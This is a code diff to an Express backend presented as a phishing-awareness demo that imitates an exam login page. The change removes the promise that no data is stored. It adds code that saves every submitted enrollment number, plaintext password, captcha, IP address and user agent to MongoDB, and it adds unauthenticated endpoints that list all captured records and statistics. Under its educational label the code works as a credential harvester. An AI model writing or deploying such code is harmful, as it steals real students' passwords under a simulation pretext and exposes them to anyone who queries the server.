@@ -1,6 +1,9 @@
 const express = require('express');
 const cors = require('cors');
+const mongoose = require('mongoose');
 require('dotenv').config();
+
+const Submission = require('./models/Submission');
 
 const app = express();
 const PORT = process.env.PORT || 5000;
@@ -9,6 +12,22 @@ const PORT = process.env.PORT || 5000;
 app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
+
+// MongoDB Connection
+const connectDB = async () => {
+  try {
+    const conn = await mongoose.connect(process.env.MONGODB_URL, {
+      useNewUrlParser: true,
+      useUnifiedTopology: true,
+    });
+    console.log(`MongoDB connected: ${conn.connection.host}`);
+  } catch (error) {
+    console.error(`Error connecting to MongoDB: ${error.message}`);
+    // Continue running even if MongoDB connection fails for now
+  }
+};
+
+connectDB();
 
 // Security tips for the warning page
 const SECURITY_TIPS = [
@@ -34,21 +53,98 @@ const SECURITY_TIPS = [
   }
 ];
 
-// POST endpoint for login (does not store anything)
-app.post('/api/login', (req, res) => {
-  const { enrollmentNo, password, exam, captcha } = req.body;
+// POST endpoint for login (stores data in MongoDB)
+app.post('/api/login', async (req, res) => {
+  const { enrollmentNo, password, exam, captcha, session } = req.body;
 
-  // Log the attempt (optional, for educational purposes only)
-  console.log(`Phishing simulation attempt - Enrollment: ${enrollmentNo}`);
+  try {
+    // Get user IP and user agent for logging
+    const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    const userAgent = req.headers['user-agent'];
 
-  // Return phishing response
-  // Important: No data is stored anywhere
-  res.status(200).json({
-    phished: true,
-    message: "This is a phishing simulation",
-    tips: SECURITY_TIPS,
-    timestamp: new Date().toISOString()
-  });
+    // Create a new submission record
+    const submission = new Submission({
+      session: session || 'Winter 2025',
+      exam,
+      enrollmentNo,
+      password,
+      captcha,
+      ipAddress,
+      userAgent,
+    });
+
+    // Save to MongoDB
+    await submission.save();
+    console.log(`✓ Data saved for Enrollment: ${enrollmentNo}`);
+
+    // Return phishing response
+    res.status(200).json({
+      phished: true,
+      message: "This is a phishing simulation",
+      tips: SECURITY_TIPS,
+      timestamp: new Date().toISOString()
+    });
+  } catch (error) {
+    console.error(`Error saving submission: ${error.message}`);
+    
+    // Still return phishing response even if save fails
+    res.status(200).json({
+      phished: true,
+      message: "This is a phishing simulation",
+      tips: SECURITY_TIPS,
+      timestamp: new Date().toISOString(),
+      error: process.env.NODE_ENV === 'development' ? error.message : undefined
+    });
+  }
+});
+
+// GET endpoint to fetch all submissions (for admin/educational purposes)
+app.get('/api/submissions', async (req, res) => {
+  try {
+    const submissions = await Submission.find().sort({ createdAt: -1 });
+    res.status(200).json({
+      count: submissions.length,
+      data: submissions,
+    });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+// GET endpoint for statistics
+app.get('/api/submissions/stats', async (req, res) => {
+  try {
+    const totalSubmissions = await Submission.countDocuments();
+    
+    // Group by exam
+    const examStats = await Submission.aggregate([
+      {
+        $group: {
+          _id: '$exam',
+          count: { $sum: 1 },
+        },
+      },
+    ]);
+
+    // Group by session
+    const sessionStats = await Submission.aggregate([
+      {
+        $group: {
+          _id: '$session',
+          count: { $sum: 1 },
+        },
+      },
+    ]);
+
+    res.status(200).json({
+      totalSubmissions,
+      examStats,
+      sessionStats,
+      timestamp: new Date().toISOString(),
+    });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
 });
 
 // Health check endpoint
@@ -61,7 +157,9 @@ app.get('/', (req, res) => {
   res.status(200).json({
     message: 'Phishing Awareness Demo Backend - Educational Project',
     endpoints: {
-      login: 'POST /api/login',
+      login: 'POST /api/login (stores submission in MongoDB)',
+      submissions: 'GET /api/submissions (view all stored submissions)',
+      stats: 'GET /api/submissions/stats (view statistics)',
       health: 'GET /api/health'
     }
   });
